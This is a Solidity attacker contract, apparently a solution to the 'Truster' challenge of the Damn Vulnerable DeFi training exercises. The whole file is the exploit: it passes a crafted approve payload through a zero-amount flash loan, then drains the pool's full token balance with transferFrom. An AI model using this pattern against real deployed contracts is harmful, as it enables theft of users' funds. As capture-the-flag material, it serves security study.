// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker{
    function attack(TrusterLenderPool pool, address attacker) public {
        IERC20 token = pool.damnValuableToken();
        uint256 poolBal = token.balanceOf(address(pool));
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)));

        pool.flashLoan(0, attacker, address(token), payload);
        token.transferFrom(address(pool), attacker, poolBal);
    }
}